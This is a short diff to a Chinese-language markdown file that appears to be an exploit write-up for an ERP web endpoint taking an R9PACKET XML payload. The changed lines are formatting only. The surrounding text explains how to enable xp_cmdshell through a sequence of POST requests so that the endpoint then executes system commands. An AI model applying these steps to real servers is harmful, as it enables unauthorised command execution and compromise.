@@ -21,7 +21,7 @@ cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATA
 
 ```
 
-## 特殊情况
+## 0x02 特殊情况
 
 大部分默认是不开启 xp_cmdshell 模块，（将如下POST数据按顺序发送），注意 master 改为当前数据库名
 
@@ -48,5 +48,6 @@ cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATA
 执行过程中报错 java.sql.SQLException【错误代码: 0; 相关信息:xxxxxx】不用理会
 
 发送请求后再使用此模块则会成功请求执行系统命令
+
 
 
